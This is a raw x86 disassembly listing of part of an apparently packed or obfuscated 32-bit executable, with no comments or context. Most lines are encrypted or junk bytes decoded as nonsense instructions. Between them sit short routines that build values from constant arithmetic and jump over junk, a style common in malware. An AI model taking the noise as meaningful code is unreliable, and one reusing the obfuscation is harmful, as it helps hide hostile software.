  40ca84:	pop    ds
  40ca85:	jg     0x40ca3e
  40ca87:	adc    al,0xc8
  40ca89:	cmc    
  40ca8a:	sbb    DWORD PTR [ebx],0xffffffe7
  40ca8d:	mov    dl,0x99
  40ca8f:	je     0x40ca13
  40ca91:	dec    ebp
  40ca92:	enter  0xcfe9,0x18
  40ca96:	mov    ds:0xf96e3281,al
  40ca9b:	arpl   cx,bp
  40ca9d:	inc    esi
  40ca9e:	ret    
  40ca9f:	test   eax,0x8b227fe6
  40caa4:	mov    ebx,0x29e64334
  40caa9:	xchg   esi,eax
  40caaa:	aas    
  40caab:	or     DWORD PTR [ebx-0x25d97ee6],0xda5fae86
  40cab5:	sbb    BYTE PTR [ebx+esi*8],ch
  40cab8:	lea    edi,[edx]
  40caba:	push   ebx
  40cabb:	sub    eax,0x6c
  40cabe:	fdiv   QWORD PTR [edx-0x49f32b37]
  40cac4:	sub    al,0xa4
  40cac6:	scas   eax,DWORD PTR es:[edi]
  40cac7:	mov    eax,ds:0x32dc672d
  40cacc:	cs jnp 0x40ca52
  40cacf:	dec    ebp
  40cad0:	cdq    
  40cad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cad2:	dec    edx
  40cad3:	fld    QWORD PTR [edi]
  40cad5:	xchg   ecx,eax
  40cad6:	xchg   ebx,eax
  40cad7:	and    DWORD PTR [esi+0x65],ebx
  40cada:	dec    ecx
  40cadb:	push   ss
  40cadc:	fldln2 
  40cade:	mov    eax,0xbeefebca
  40cae3:	das    
  40cae4:	xor    edi,ebx
  40cae6:	cmc    
  40cae7:	jg     0x40cb53
  40cae9:	inc    edi
  40caea:	push   0xf92788a5
  40caef:	and    edi,esi
  40caf1:	stos   BYTE PTR es:[edi],al
  40caf2:	fst    DWORD PTR [edx-0x41]
  40caf5:	jge    0x40cade
  40caf7:	pop    eax
  40caf8:	ret    0x2ad0
  40cafb:	(bad)  
  40cafc:	jns    0x40caf8
  40cafe:	outs   dx,DWORD PTR es:[esi]
  40cb00:	(bad)  
  40cb01:	fcmove st,st(1)
  40cb03:	push   ds
  40cb04:	imul   esi,DWORD PTR [edx+0x5f2f9bb9],0x8f025a2b
  40cb0e:	(bad)  
  40cb0f:	fmulp  st(2),st
  40cb11:	das    
  40cb12:	call   0xd51d:0xffd452f2
  40cb19:	test   DWORD PTR [ebp-0x50b87284],0x82873fc2
  40cb23:	into   
  40cb24:	jne    0x40cb12
  40cb26:	push   edx
  40cb27:	jb     0x40caa9
  40cb29:	add    edi,DWORD PTR [edi+0x280289b6]
  40cb2f:	in     eax,dx
  40cb30:	jmp    0x40cb68
  40cb32:	lahf   
  40cb33:	inc    ebp
  40cb34:	gs and eax,0xba8a0030
  40cb3a:	xor    DWORD PTR [ebx],0xc3fdf78a
  40cb40:	(bad)  
  40cb42:	outs   dx,DWORD PTR ss:[esi]
  40cb44:	inc    eax
  40cb45:	retw   0x4945
  40cb49:	loopne 0x40cb2f
  40cb4b:	jp     0x40cb08
  40cb4d:	mov    edx,0xba2ae0dd
  40cb52:	jne    0x40cb6e
  40cb54:	fcomp  DWORD PTR [edx-0x24]
  40cb57:	(bad)  
  40cb58:	xchg   esi,eax
  40cb59:	push   ecx
  40cb5a:	xchg   ebp,eax
  40cb5b:	fistp  DWORD PTR [edi+0x6ea96362]
  40cb61:	dec    edi
  40cb62:	jecxz  0x40cbb9
  40cb64:	inc    esi
  40cb65:	bound  esi,QWORD PTR [ebp-0x69]
  40cb68:	in     al,dx
  40cb69:	mov    cl,0x8a
  40cb6b:	and    BYTE PTR [ecx],bl
  40cb6d:	test   DWORD PTR [ebx-0x6],edx
  40cb70:	repnz or BYTE PTR [edx+0x9],bh
  40cb74:	fistp  DWORD PTR ds:0x5bb286fb
  40cb7a:	out    dx,eax
  40cb7b:	mov    al,ds:0xe9e0956c
  40cb80:	cld    
  40cb81:	dec    ebp
  40cb82:	std    
  40cb83:	je     0x40cb4b
  40cb85:	data16 lahf 
  40cb87:	ins    BYTE PTR es:[edi],dx
  40cb88:	jl     0x40cb2e
  40cb8a:	cli    
  40cb8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb8d:	in     eax,0x77
  40cb8f:	or     eax,DWORD PTR [ebp-0x58]
  40cb92:	push   cs
  40cb93:	and    eax,0x71a5f264
  40cb98:	gs mov edx,0x75927ec0
  40cb9e:	mov    ecx,0x8ac8f64d
  40cba3:	push   eax
  40cba4:	lock inc esp
  40cba6:	mov    cl,0x16
  40cba8:	push   eax
  40cba9:	or     DWORD PTR [ecx],eax
  40cbab:	push   eax
  40cbac:	sub    ebp,0x8d611f29
  40cbb2:	repz iret 
  40cbb4:	gs sar dh,1
  40cbb7:	nop
  40cbb8:	jmp    0x40cb90
  40cbba:	pop    ecx
  40cbbb:	outs   dx,BYTE PTR ds:[esi]
  40cbbc:	les    ebp,FWORD PTR [ebp+edi*1-0x3e]
  40cbc0:	call   0xb03f:0x8db1b87d
  40cbc7:	dec    ecx
  40cbc8:	pop    ss
  40cbc9:	dec    edi
  40cbca:	sub    DWORD PTR [edx*4-0x2211aad],edi
  40cbd1:	aaa    
  40cbd2:	cmp    eax,0x4f30e31d
  40cbd7:	mov    al,ds:0x6c418ea
  40cbdc:	pop    eax
  40cbdd:	(bad)  [ebx+0xf]
  40cbe0:	and    DWORD PTR [ecx],0x0
  40cbe3:	add    BYTE PTR [eax],al
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x4226a0,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax-0x4f4ebbcc],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    BYTE PTR [ecx-0x51],dl
  40cc79:	outs   dx,BYTE PTR ds:[esi]
  40cc7a:	xor    DWORD PTR [ebp-0x70],edi
  40cc7d:	inc    eax
  40cc7e:	stos   BYTE PTR es:[edi],al
  40cc7f:	sbb    DWORD PTR [esi-0x45ee28b4],ecx
  40cc85:	inc    edx
  40cc86:	xor    eax,0x73e8b630
  40cc8b:	or     al,0x0
  40cc8d:	cmp    cl,al
  40cc8f:	cmc    
  40cc90:	add    al,0x17
  40cc92:	pop    ebx
  40cc93:	cmp    BYTE PTR [ebp+0x3e8b15f8],dl
  40cc99:	repz push edx
  40cc9b:	adc    al,0x19
  40cc9d:	dec    ebp
  40cc9e:	mov    ecx,0x60949ec6
  40cca3:	ror    DWORD PTR [ecx-0x5d4bbf3e],cl
  40cca9:	mov    ebx,0xc69e8a2a
  40ccae:	call   0x8f5f:0x818e7503
  40ccb5:	mov    ecx,0x6122cae8
  40ccba:	inc    ecx
  40ccbb:	fbstp  TBYTE PTR [edi+0x52]
  40ccbe:	lock cdq 
  40ccc0:	out    0x1b,eax
  40ccc2:	push   ebx
  40ccc3:	or     dl,bh
  40ccc5:	pop    ss
  40ccc6:	fisttp WORD PTR [esi+eax*2]
  40ccc9:	(bad)  
  40ccca:	cli    
  40cccb:	(bad)  
  40cccd:	adc    ebx,DWORD PTR [ebp-0x79]
  40ccd0:	jp     0x40cd49
  40ccd2:	rcl    BYTE PTR [edx],cl
  40ccd4:	lods   eax,DWORD PTR ds:[esi]
  40ccd5:	mov    al,0xd7
  40ccd7:	mov    ah,0xd2
  40ccd9:	call   0xbf7c1a9e
  40ccde:	rcl    bl,0x17
  40cce1:	inc    esi
  40cce2:	mov    cs,WORD PTR [edi]
  40cce4:	call   0x132c:0xf53fcae3
  40cceb:	stc    
  40ccec:	and    al,0xc5
  40ccee:	loope  0x40cd43
  40ccf0:	stos   BYTE PTR es:[edi],al
  40ccf1:	jmp    0x40cd3b
  40ccf3:	into   
  40ccf4:	call   0x5449:0x43feac5b
  40ccfb:	add    BYTE PTR [ebp-0x1ddde9cb],ch
  40cd01:	mov    bh,0x77
  40cd03:	mov    al,ds:0x51c848b5
  40cd08:	mov    eax,0xfe1b1862
  40cd0d:	push   ds
  40cd0e:	scas   eax,DWORD PTR es:[edi]
  40cd0f:	mov    BYTE PTR [ebx+edx*8+0x6d],bh
  40cd13:	ror    ebx,0x17
  40cd16:	jmp    0x78ac:0xd1b4b844
  40cd1d:	ins    BYTE PTR es:[edi],dx
  40cd1e:	dec    DWORD PTR [edx]
  40cd20:	adc    eax,0x4c74a1d7
  40cd25:	and    DWORD PTR [ecx-0x2d],0xc5702a39
  40cd2c:	sub    DWORD PTR [edi],edx
  40cd2e:	rcr    DWORD PTR ds:0x41274e54,1
  40cd34:	push   0x587ccf9f
  40cd39:	sub    esp,ebp
  40cd3b:	cld    
  40cd3c:	int3   
  40cd3d:	pop    ebx
  40cd3e:	lea    eax,[ecx+0x7b]
  40cd41:	je     0x40cd29
  40cd43:	inc    ebx
  40cd44:	xchg   ch,dl
  40cd46:	pop    ds
  40cd47:	ror    DWORD PTR [edx],0x49
  40cd4a:	enter  0x88e1,0x87
  40cd4e:	mov    BYTE PTR [edi+0x6c336041],dl
  40cd54:	addr16 cli 
  40cd56:	aad    0x3
  40cd58:	adc    al,0xe2
  40cd5a:	leave  
  40cd5b:	adc    al,0x52
  40cd5d:	jnp    0x40cdda
  40cd5f:	and    bh,BYTE PTR [ecx+0x772fafe]
  40cd65:	push   es
  40cd66:	or     DWORD PTR [ecx+0x67],eax
  40cd69:	mov    ebx,0x898cf667
  40cd6e:	add    eax,0x5956170a
  40cd73:	pop    ss
  40cd74:	mov    ecx,0xbbc3002e
  40cd79:	jnp    0x40cd15
  40cd7b:	pop    edx
  40cd7c:	bound  esi,QWORD PTR [esi]
  40cd7e:	or     al,0x62
  40cd80:	aam    0x80
  40cd82:	pop    ebp
  40cd83:	addr16 popf 
  40cd85:	lock fnstsw WORD PTR [ecx]
  40cd88:	cs jmp 0x848a:0x738d8e48
  40cd90:	ror    DWORD PTR [edi-0x28a11812],1
  40cd96:	sub    eax,0x61a67255
  40cd9b:	(bad)  
  40cd9c:	pop    esi
  40cd9d:	push   edi
  40cd9e:	mov    ah,0xd4
  40cda0:	mov    edi,0x703948f2
  40cda5:	imul   ecx,DWORD PTR [ecx-0x49],0x2ff7e908
  40cdac:	mov    ds:0xf473b288,eax
  40cdb1:	mul    DWORD PTR [eax-0x5da6a28e]
  40cdb7:	jp     0x40cd3e
  40cdb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdba:	xor    edi,DWORD PTR [eax-0x57]
  40cdbd:	ficomp WORD PTR [ebp+0x0]
  40cdc0:	dec    ebx
  40cdc1:	mov    eax,ds:0x4a2bd46e
  40cdc6:	mov    esi,0xf85424b1
  40cdcb:	ret    0xd424
  40cdce:	sub    DWORD PTR [ecx-0x71],ebp
  40cdd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdd2:	xchg   ebp,eax
  40cdd3:	ror    ah,cl
  40cdd5:	pop    esp
  40cdd6:	mov    ah,0xa9
  40cdd8:	out    0xb,eax
  40cdda:	pop    edx
  40cddb:	fldcw  WORD PTR [esi]
  40cddd:	loopne 0x40cdf8
  40cddf:	(bad)  
  40cde0:	popf   
  40cde1:	or     DWORD PTR [edx],ecx
  40cde3:	sbb    dl,BYTE PTR [ebx+esi*4]
  40cde6:	jecxz  0x40cda8
  40cde8:	scas   eax,DWORD PTR es:[edi]
  40cde9:	ret    
  40cdea:	mov    ds:0xbc714267,al
  40cdef:	gs das 
  40cdf1:	and    ebp,DWORD PTR [esi+0x2a]
  40cdf4:	outs   dx,DWORD PTR ds:[esi]
  40cdf5:	jge    0x40cd7b
  40cdf7:	pop    esp
  40cdf8:	or     eax,0x74f13290
  40cdfd:	out    dx,eax
  40cdfe:	or     DWORD PTR cs:[eax-0x3e],ecx
  40ce02:	fist   WORD PTR [ecx-0x3a8e559c]
  40ce08:	or     eax,0x4abca113
  40ce0d:	inc    ebp
  40ce0e:	inc    esp
  40ce0f:	pop    edi
  40ce10:	inc    ebp
  40ce11:	dec    eax
  40ce12:	mov    eax,ds:0x9b1b11f1
  40ce17:	xchg   DWORD PTR ds:0x1b7d246c,ebx
  40ce1d:	xchg   BYTE PTR [ebx+0x22a54245],dl
  40ce23:	xor    DWORD PTR [ebx+0xd],esp
  40ce26:	pushf  
  40ce27:	add    BYTE PTR [edi+0x53f07e5b],dl
  40ce2d:	push   ebx
  40ce2e:	mov    ebx,0x2a96fdc3
  40ce33:	pop    edi
  40ce34:	arpl   WORD PTR [edi+esi*1],di
  40ce37:	ss push ecx
  40ce39:	push   esi
  40ce3a:	addr16 xchg ecx,eax
  40ce3c:	neg    ebp
  40ce3e:	push   esi
  40ce3f:	test   BYTE PTR [ebp+ecx*1+0x51],al
  40ce43:	cmc    
  40ce44:	mov    edx,0xaeb1418b
  40ce49:	test   DWORD PTR [ebx],esi
  40ce4b:	cmp    esp,DWORD PTR [ecx-0x1]
  40ce4e:	dec    edi
  40ce4f:	ins    BYTE PTR es:[edi],dx
  40ce50:	inc    eax
  40ce51:	inc    ecx
  40ce52:	and    DWORD PTR [eax],ebx
  40ce54:	sar    DWORD PTR [esi],cl
  40ce56:	repz ja 0x40ce49
  40ce59:	pop    esp
  40ce5a:	xor    DWORD PTR [eax+esi*8-0x5c],ebx
  40ce5e:	ret    0x27f
  40ce61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce62:	imul   DWORD PTR [ebp-0x80]
  40ce65:	pop    ds
  40ce66:	sahf   
  40ce67:	pop    edx
  40ce68:	mov    edi,0xfe0da8c
  40ce6d:	mov    cl,0x3b
  40ce6f:	pop    esi
  40ce70:	pushf  
  40ce71:	fiadd  DWORD PTR [ebx-0x50]
  40ce74:	xor    al,0x79
  40ce76:	and    DWORD PTR [edi],esi
  40ce78:	jl     0x40ce44
  40ce7a:	mov    ch,0x38
  40ce7c:	or     bh,al
  40ce7e:	mov    ebx,0x97f5e7fd
  40ce83:	cmp    eax,0x34387229
  40ce88:	les    eax,FWORD PTR [ebp+0x56]
  40ce8b:	cld    
  40ce8c:	add    al,0xe6
  40ce8e:	jne    0x40ce2e
  40ce90:	pop    ebx
  40ce91:	call   eax
  40ce93:	sbb    esi,DWORD PTR [edi+0x2fe273e5]
  40ce99:	cmp    BYTE PTR [ebx-0x3aa6aece],0x98
  40cea0:	aam    0xc9
  40cea2:	stos   DWORD PTR es:[edi],eax
  40cea3:	jne    0x40cee5
  40cea5:	nop
  40cea6:	popf   
  40cea7:	test   DWORD PTR [edi-0x47],edx
  40ceaa:	sbb    BYTE PTR [ecx],bh
  40ceac:	add    DWORD PTR [esi+eiz*1-0x23553123],ecx
  40ceb3:	sub    eax,0x6e19d106
  40ceb8:	test   eax,0x4ea40eb8
  40cebd:	data16 add al,0x3d
  40cec0:	enter  0xebb6,0x62
  40cec4:	jecxz  0x40ce86
  40cec6:	enter  0xd825,0xa7
  40ceca:	rcl    DWORD PTR [esi],cl
  40cecc:	pop    ds
  40cecd:	rcl    DWORD PTR [esi+0xe],1
  40ced0:	pusha  
  40ced1:	mov    edi,0xff083e42
  40ced6:	enter  0xaaf6,0x61
  40ceda:	jns    0x40cf00
  40cedc:	cmp    eax,0x39c5281e
  40cee1:	int3   
  40cee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cee3:	jmp    0xf02a2a5d
  40cee8:	fst    DWORD PTR [eax+eax*4]
  40ceeb:	sub    ch,cl
  40ceed:	sub    bh,BYTE PTR [ecx-0x17]
  40cef0:	(bad)  
  40cef1:	mov    eax,ds:0x397a6870
  40cef6:	xor    BYTE PTR [ecx],bh
  40cef8:	mov    ah,0xa
  40cefa:	or     edi,DWORD PTR [ecx]
  40cefc:	test   BYTE PTR ds:0x4545061d,dh
  40cf02:	test   al,0x8f
  40cf04:	mov    dl,0x1f
  40cf06:	ret    0x53cc
  40cf09:	out    0x81,eax
  40cf0b:	and    ch,BYTE PTR [edi+0x72]
  40cf0e:	and    BYTE PTR [edi],ah
  40cf10:	aas    
  40cf11:	test   eax,0xd043c277
  40cf16:	cli    
  40cf17:	cmp    DWORD PTR [edx+0x13],0x9
  40cf1b:	mov    ah,0x17
  40cf1d:	or     BYTE PTR [ebx-0x37d403bb],cl
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422598
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi+0x700dbcd3],esi
  40cfad:	shl    DWORD PTR [eax+0x1818e872],0xd2
  40cfb4:	adc    al,0x18
  40cfb6:	sbb    BYTE PTR [eax-0x55ce5180],dh
  40cfbc:	adc    DWORD PTR [eax-0x20],esp
  40cfbf:	test   BYTE PTR [eax+ecx*2-0x3a],cl
  40cfc3:	jns    0x40cf84
  40cfc5:	push   esp
  40cfc6:	out    dx,al
  40cfc7:	sahf   
  40cfc8:	ret    0x4339
  40cfcb:	je     0x40cfc5
  40cfcd:	push   0xffffff87
  40cfcf:	xchg   ecx,eax
  40cfd0:	jns    0x40cfe3
  40cfd2:	das    
  40cfd3:	bound  esi,QWORD PTR [ecx+0x60]
  40cfd6:	and    ebp,DWORD PTR [edi]
  40cfd8:	and    al,0x8e
  40cfda:	inc    edi
  40cfdb:	rcr    DWORD PTR [ecx+0x15993734],cl
  40cfe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfe2:	sub    BYTE PTR [ebx+0x68],bh
  40cfe5:	jecxz  0x40cf78
  40cfe7:	jbe    0x40d054
  40cfe9:	popf   
  40cfea:	call   0x2e907629
  40cfef:	or     al,0x65
  40cff1:	repz jle 0x40cfbb
  40cff4:	data16 jge 0x40cfc5
  40cff7:	dec    eax
  40cff8:	in     eax,dx
  40cff9:	outs   dx,BYTE PTR ds:[esi]
  40cffa:	dec    ebx
  40cffb:	in     al,0xc
  40cffd:	stos   DWORD PTR es:[edi],eax
  40cffe:	sbb    ecx,esi
  40d000:	jmp    0x7cdd:0xc20de0b6
  40d007:	sbb    dl,bh
  40d009:	sub    ecx,edx
  40d00b:	iret   
  40d00c:	adc    al,0x76
  40d00e:	and    ebp,0x58
  40d011:	sbb    al,0x88
  40d013:	repnz retf 
  40d015:	call   0x18b59145
  40d01a:	in     al,dx
  40d01b:	dec    ebp
  40d01c:	add    al,0xb5
  40d01e:	jl     0x40cfed
  40d020:	jle    0x40d04e
  40d022:	imul   esi,DWORD PTR [ebx-0x50],0xffffffbc
  40d026:	scas   eax,DWORD PTR es:[edi]
  40d027:	lods   al,BYTE PTR ds:[esi]
  40d028:	jno    0x40d00d
  40d02a:	call   0xc495:0x2650f24b
  40d031:	and    DWORD PTR [ecx],ebx
  40d033:	mov    al,0x41
  40d035:	rcr    DWORD PTR [ecx+0x52e108ef],cl
  40d03b:	icebp  
  40d03c:	pop    edx
  40d03d:	mov    eax,ds:0x852a0b07
  40d042:	mov    gs,esp
  40d044:	jle    0x40d07d
  40d046:	js     0x40d019
  40d048:	fcom   QWORD PTR [ebp-0x7d3f148d]
  40d04e:	sbb    eax,0xf69f5634
  40d053:	mov    dh,0x3b
  40d055:	outs   dx,DWORD PTR ds:[esi]
  40d056:	or     bl,BYTE PTR [ebx]
  40d058:	bsf    edx,DWORD PTR [esi]
  40d05b:	in     al,dx
  40d05c:	pop    eax
  40d05d:	ja     0x40d003
  40d05f:	mov    cl,0x7e
  40d061:	outs   dx,DWORD PTR ds:[esi]
  40d062:	imul   edx,DWORD PTR [esi+eiz*1+0x1b],0x2d24e5b8
  40d06a:	xor    cl,dh
  40d06c:	inc    esp
  40d06d:	sub    BYTE PTR [edi+0x34ef1972],0xc4
  40d074:	jb     0x40d09d
  40d076:	mov    ebp,ss
  40d078:	and    DWORD PTR [edx],esp
  40d07a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d07b:	or     esp,ebp
  40d07d:	sub    bh,ch
  40d07f:	outs   dx,DWORD PTR ds:[esi]
  40d080:	fidivr DWORD PTR [edi+0x6631b9df]
  40d086:	inc    ebx
  40d087:	mov    ecx,fs
  40d089:	shr    BYTE PTR [ebx],1
  40d08b:	mov    ebp,0x1364eff3
  40d090:	and    DWORD PTR [edi],eax
  40d092:	mov    ?,WORD PTR [edi+0x1c]
  40d095:	sar    BYTE PTR [edi],cl
  40d097:	out    0x86,al
  40d099:	mov    edi,0xeb70f4be
  40d09e:	not    BYTE PTR [di-0x19db]
  40d0a3:	fldenv [esi]
  40d0a5:	inc    ebx
  40d0a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0a7:	test   eax,0x8cc8ceda
  40d0ac:	into   
  40d0ad:	mov    eax,ds:0x915d092e
  40d0b2:	fist   DWORD PTR [ebx]
  40d0b4:	push   es
  40d0b5:	mov    eax,ds:0x5f7ae887
  40d0ba:	adc    edi,DWORD PTR [esi-0x2d]
  40d0bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0be:	call   0xd99d0bef
  40d0c3:	dec    ecx
  40d0c4:	mov    ebx,0xe4426905
  40d0c9:	in     al,0xef
  40d0cb:	pop    edi
  40d0cc:	idiv   DWORD PTR [edi+0x5971a523]
  40d0d2:	mov    ch,0xc6
  40d0d4:	pusha  
  40d0d5:	dec    esp
  40d0d6:	adc    al,0xb8
  40d0d8:	jne    0x40d156
  40d0da:	inc    esp
  40d0db:	ja     0x40d122
  40d0dd:	daa    
  40d0de:	jmp    0xe2b4:0x146496a3
  40d0e5:	loopne 0x40d0d3
  40d0e7:	call   0xa3de1117
  40d0ec:	(bad)  
  40d0ed:	or     dl,ah
  40d0ef:	(bad)  
  40d0f1:	mov    edx,0x764f6aca
  40d0f6:	test   BYTE PTR [edx+edx*8],ch
  40d0f9:	bound  esp,QWORD PTR [ecx+0x54]
  40d0fc:	xchg   ecx,eax
  40d0fd:	sahf   
  40d0fe:	bound  edi,QWORD PTR [edi+0x59]
  40d101:	aas    
  40d102:	shl    DWORD PTR [edx],cl
  40d104:	and    ah,BYTE PTR [eax+0x38]
  40d107:	(bad)  
  40d108:	es in  eax,0xfd
  40d10b:	lahf   
  40d10c:	dec    edx
  40d10d:	pushf  
  40d10e:	push   es
  40d10f:	cmp    ecx,DWORD PTR [ecx-0x1650f58e]
  40d115:	jbe    0x40d188
  40d117:	jle    0x40d0ef
  40d119:	inc    eax
  40d11a:	push   ebx
  40d11b:	push   ebp
  40d11c:	inc    esp
  40d11d:	sahf   
  40d11e:	mov    ds,WORD PTR [edx-0x45]
  40d121:	mov    ah,0xb0
  40d123:	outs   dx,DWORD PTR ds:[esi]
  40d124:	shl    BYTE PTR [eax+0x46a66007],1
  40d12a:	or     dl,bl
  40d12c:	or     ebx,DWORD PTR [ebp-0x72]
  40d12f:	add    bh,dh
  40d131:	xchg   ecx,eax
  40d132:	retf   0x8f82
  40d135:	das    
  40d136:	push   es
  40d137:	in     al,0x4a
  40d139:	in     eax,0x6c
  40d13b:	xor    eax,DWORD PTR [ebp+edx*1-0x6373e650]
  40d142:	je     0x40d0c8
  40d144:	add    bh,BYTE PTR [ebx+0x36]
  40d147:	and    ah,BYTE PTR [ecx-0x2512bec4]
  40d14d:	mov    edi,0xd1d9acc3
  40d152:	clc    
  40d153:	into   
  40d154:	mov    bh,BYTE PTR [ecx]
  40d156:	in     al,dx
  40d157:	out    dx,eax
  40d158:	adc    esp,eax
  40d15a:	scas   al,BYTE PTR es:[edi]
  40d15b:	xchg   ebx,eax
  40d15c:	add    edx,ecx
  40d15e:	adc    ch,BYTE PTR [ebx+0x1]
  40d161:	push   edx
  40d162:	mov    ebx,ecx
  40d164:	mov    al,ds:0xb83716db
  40d169:	loopne 0x40d1ba
  40d16b:	shr    DWORD PTR [ebp+0x1a],1
  40d16e:	or     eax,esp
  40d170:	mov    ds:0x6756b8db,eax
  40d175:	pop    esi
  40d176:	stc    
  40d177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d178:	ins    DWORD PTR es:[edi],dx
  40d179:	test   DWORD PTR [edx-0x14],ecx
  40d17c:	shr    BYTE PTR [ebp+edi*2+0x6d],0x7
  40d181:	lock (bad) 
  40d183:	cwde   
  40d184:	mov    ebx,0x448c16f3
  40d189:	or     esp,DWORD PTR [ebp+0x3a]
  40d18c:	or     ebx,edx
  40d18e:	push   es
  40d18f:	fild   QWORD PTR [ecx-0x32]
  40d192:	test   dh,cl
  40d194:	dec    ecx
  40d195:	jnp    0x40d163
  40d197:	adc    al,0xf2
  40d199:	call   0x5d7c:0x1d59fd75
  40d1a0:	sub    BYTE PTR [edx],dl
  40d1a2:	jbe    0x40d1aa
  40d1a4:	jp     0x40d201
  40d1a6:	je     0x40d1f0
  40d1a8:	xlat   BYTE PTR ds:[ebx]
  40d1a9:	popa   
  40d1aa:	gs aad 0xb
  40d1ad:	and    edi,edx
  40d1af:	les    ebp,FWORD PTR [eax-0x2bebf347]
  40d1b5:	jp     0x40d143
  40d1b7:	lds    edx,FWORD PTR [edx-0x27]
  40d1ba:	inc    ebx
  40d1bb:	enter  0xb8b1,0x6b
  40d1bf:	or     bl,bh
  40d1c1:	sbb    eax,0x2788dec2
  40d1c6:	or     esp,edi
  40d1c8:	sti    
  40d1c9:	jge    0x40d1ad
  40d1cb:	mov    bl,BYTE PTR [ebx-0x1da16491]
  40d1d1:	outs   dx,BYTE PTR ds:[esi]
  40d1d2:	sub    cl,BYTE PTR [edx-0x7459b44]
  40d1d8:	xchg   edi,eax
  40d1d9:	sub    eax,0x52e8f46c
  40d1de:	scas   eax,DWORD PTR es:[edi]
  40d1df:	aad    0x8d
  40d1e1:	clc    
  40d1e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1e3:	mov    cl,0x6f
  40d1e5:	xchg   BYTE PTR ds:0xfbf27070,cl
  40d1eb:	mov    ch,0xf9
  40d1ed:	and    DWORD PTR [esi+0x1c95f89e],ebx
  40d1f3:	inc    ecx
  40d1f4:	sbb    esp,DWORD PTR [ebp-0x39]
  40d1f7:	dec    ebx
  40d1f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1f9:	(bad)  
  40d1fa:	in     eax,dx
  40d1fb:	jp     0x40d1bc
  40d1fd:	jecxz  0x40d211
  40d1ff:	fsubr  st,st(7)
  40d201:	pop    esp
  40d202:	mov    bh,0xac
  40d204:	hlt    
  40d205:	pushf  
  40d206:	jae    0x40d21c
  40d208:	stos   BYTE PTR es:[edi],al
  40d209:	jo     0x40d27a
  40d20b:	and    BYTE PTR [ebx],al
  40d20d:	push   ds
  40d20e:	xor    al,0xf4
  40d210:	cmp    eax,0x482b2262
  40d215:	mov    esp,0xbbe8d6a2
  40d21a:	sbb    ebx,DWORD PTR ds:0x2025b5fe
  40d220:	fucom  st(0)
  40d222:	gs js  0x40d1ac
  40d225:	aaa    
  40d226:	popf   
  40d227:	adc    eax,0x7b978b7b
